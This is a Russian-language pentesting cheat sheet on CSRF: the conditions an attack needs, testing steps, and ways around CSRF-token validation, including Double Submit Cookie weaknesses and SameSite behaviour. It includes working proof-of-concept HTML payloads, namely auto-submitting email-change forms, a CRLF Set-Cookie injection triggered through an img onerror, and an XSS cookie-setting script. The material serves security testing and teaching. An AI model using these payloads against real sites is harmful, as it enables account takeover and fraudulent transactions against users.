# **CSRF(client)**

> CSRF — Cross-Site Request Forgery, подделка межсайтовых запросов. Уязвимость, при которой злоумышленник может незаметно заставить жертву выполнить нежелательные действия в веб-приложении, где она уже аутентифицирована.

## Условия для CSRF-атаки

* **Авторизационный токен хранится в куки.**
> На клиентской стороне есть три хранилища данных: куки, `localStorage` и `sessionStorage`. Сайты по-разному распределяют данные между ними. Авторизационный токен обычно хранят в куках, реже — в `localStorage`, почти никогда — в `sessionStorage`. Только куки браузер автоматически прикладывает к запросам.

* **Есть действие, которое интересно злоумышленнику.**
> Это любое действие, которое изменяет состояние сервера и может принести выгоду. Например, смена пароля или почты, отправка сообщения, денежный перевод.

* **Данные в запросе передаются в простом формате.**
> Условие связано с CORS — это механизм безопасности браузера, который регулирует запросы ресурсов с одного домена на другой. Если формат данных сложный, то и сам запрос сложный. Сложные запросы браузер не пропустит без OPTIONS — предварительного запроса для проверки разрешения на запрос с другого домена. По умолчанию считаем, что CORS на атакуемом сайте не настроен. Значит, запрос до него не дойдёт, и атака не сорвётся.

* **Сервер не ждёт в запросе энтропийный параметр, который неизвестен злоумышленнику.**
> Энтропийный параметр — это CSRF-токен. Это случайное значение, которое сложно угадать или забрутфорсить. Сервер использует его для аутентификации наравне с авторизационным токеном. Самая эффективная защита от CSRF.

# **Как тестировать**

- Проверь, где хранится CSRF-токен. Если он хранится в куки, приложение уязвимо.
- Выполни запрос с неверным CSRF-токеном — замени символ в своём токене. Иногда разработчики не проверяют его валидность.
- Отправь запрос без CSRF-токена. Приложения не всегда проверяют его наличие.
- Подставь в запрос валидный токен другого пользователя. Достаточно подставить в PoC свой собственный CSRF-токен. Если токен не привязан к сессии пользователя, сервис выполнит такой запрос.
- Если в запросе сложный формат данных, замени его на простой. Например, вместо `Content-Type: application/json` == `Content-Type: application/x-www-form-urlencoded`. Высока вероятность, что сервер некорректно обрабатывает тип данных. Тогда запрос завершится успешно.
- Другие запросы, которые могут заинтересовать. Возможно, в них нет CSRF-токена. Обратить внимание и на GET-запросы.

# Обход проверки CSRF-токена

> **CSRF-токен** — это уникальное, секретное и непредсказуемое значение, которое генерируется серверным приложением и передается клиенту. При отправке запроса на выполнение конфиденциального действия, например, отправку формы, клиент должен указать правильный CSRF-токен. В противном случае сервер откажется выполнить запрошенное действие.

Распространенный способ передачи CSRF-токенов клиенту — включение их в качестве скрытого параметра в HTML-форму.
```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

### **Валидация CSRF-токена зависит от метода запроса**
	* Некоторые приложения корректно проверяют токен при использовании метода POST в запросе, но пропускают валидацию при использовании метода GET.
```
<form action="https://victimsite.net/my-account/change-email">
    <input type="hidden" name="email" value="a1e00e00b7@mail.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
### **Валидация CSRF-токена зависит от наличия токена**
* Некоторые приложения корректно проверяют токен при его наличии, но пропускают валидацию, если токен отсутствует.
### **CSRF-токен не привязан к сеансу пользователя**
* Некоторые приложения не проверяют принадлежность токена к тому же сеансу, что и пользователь, выполняющий запрос. Вместо этого приложение поддерживает глобальный пул выпущенных им токенов и принимает любые токены из этого пула.
* менять не сам токен в запросе, а сессионную куки.
### **CSRF-токен привязан к несеансовому cookie-файлу**
* В одном из вариантов предыдущей уязвимости некоторые приложения привязывают CSRF-токен к cookie-файлу, но не к тому, который используется для отслеживания сеансов. Это может легко произойти, когда приложение использует два разных фреймворка, один для обработки сеанса, а другой для защиты от CSRF-атак, которые не интегрированы друг с другом.
* Если на веб-сайте есть какое-либо поведение, позволяющее установить cookie-файл в браузере цели, то атака возможна.
  * войти в приложение, используя свою учётную запись,
  * получить действительный токен и связанный с ним cookie-файл,
  * использовать механизм установки cookie-файлов для размещения своего cookie-файла в браузере цели и передать свой токен в ходе CSRF-атаки.
```
<html>
<body>
<form action="https://target-site.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="anaaayt@web-academy.net">
   <input type="hidden" name="csrf" value="5leGMq3x1hvmoWYQjeUYphFXWFHvwc9I">
   <input type="submit" value="Submit request">
</form>
<img src="https://target-site.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UaLmYw9A6hhiv2xtHQqwApCPl7mhux9L%3b%20SameSite=None" onerror="document.forms[0].submit()">
</body>
</html>
```

> Функция установки cookie-файлов не обязательно должна существовать в том же веб-приложении, что и уязвимость CSRF. Любое другое приложение в том же DNS-домене потенциально может быть использовано для установки cookie-файлов в атакуемом приложении, если контролируемый cookie-файл имеет подходящую область действия.

### **CSRF-токен просто дублируется в cookie-файле**

* **Реализация Double Submit Cookie:**
  
* Naive Double Submit Cookie — CSRF-токен отправляют в одном запросе дважды. Первый раз в куки, второй — в качестве параметра или заголовка запроса.
	* Пользователь отправляет запрос, сайт добавляет в него CSRF-токен. 
	* Браузер, прикладывает к запросу куки, в которой хранится такой же токен.
	* Сервер получает два токена и сравнивает их между собой. Если значения совпадают, запрос считается легитимным. 
	* Если не совпадают — сервер отклоняет запрос.
> Уязвимость: CSRF-токен не привязан к сессии пользователя.

* XSS на поддомене
```
<script>document.cookie = "csrf_token=f12fa086-3655-425a-8c82-86d7c815c021;
Path=/submit; domain=example.com";</script> 
```
* CRLF-атака
```
%0d%0aSet-Cookie:%20csrfKey=UaLmYw9A6hhiv2xhux9L%3b%20SameSite=None
```
* Naive Double Submit Cookie и CORS 
> Если токен пересылают в заголовке запроса, возникнут дополнительные трудности. Можно воспользоваться этими двумя уязвимостями, только если на сервере неправильно настроен CORS.

# Значения `SameSite`
- `None`: браузер отправляет куки с любым запросом — вне зависимости от его источника. Это используют в основном для межсайтовой навигации.
- `Strict`: куки отправляют, только если сайт, которому предназначен запрос, совпадает с сайтом, который указан в адресной строке. К межсайтовым запросам куки не добавляют.
- `Lax`: куки добавляют к запросам, которые инициированы тем же сайтом; и в некоторых других случаях — например, если переход по ссылке на другой домен использует метод GET.
Если у куки значение `SameSite` не установлено:
- браузер будет обрабатывать её как куки со значением `Lax`,
- в первые 120 секунд все ограничения игнорируются.



# **Профит**
	
- Захват аккаунта в приложениях с возможностью управления деньгами.
- Захват аккаунта с критичными персональными данными.
- Подделка запроса на выполнение критичного действия — например, перевода денег.
	

# URL

- https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie
- https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
